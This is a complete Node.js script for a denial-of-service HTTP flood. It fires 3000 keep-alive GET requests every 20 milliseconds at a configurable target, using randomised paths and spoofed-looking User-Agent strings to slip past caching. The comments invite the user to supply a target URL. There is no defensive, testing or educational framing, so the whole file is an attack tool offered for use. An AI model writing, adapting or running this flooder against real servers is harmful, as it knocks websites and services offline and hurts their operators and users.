const http = require('http');

const target = 'http://example.com'; // Replace with target URL
const maxConnections = 3000; // Increased connections for high-speed flooding
const interval = 20; // Reduced time interval

function hyperFlood() {
    for (let i = 0; i < maxConnections; i++) {
        const options = {
            hostname: target.replace('http://', '').replace('https://', ''),
            port: 80,
            method: 'GET',
            path: `/random?${Math.random()}`,
            headers: {
                'User-Agent': `Mozilla/5.0 (Hyper-Speed) AppleWebKit/${Math.floor(Math.random() * 500)} Safari/537.36`,
                'Accept': '*/*',
                'Connection': 'keep-alive',
            },
        };

        const req = http.request(options, (res) => {
            console.log(`[Connection ${i}] Status: ${res.statusCode}`);
        });

        req.on('error', (e) => {
            console.error(`[Connection ${i}] Error: ${e.message}`);
        });

        req.end();
    }
}

setInterval(hyperFlood, interval); // High-speed flood every 20ms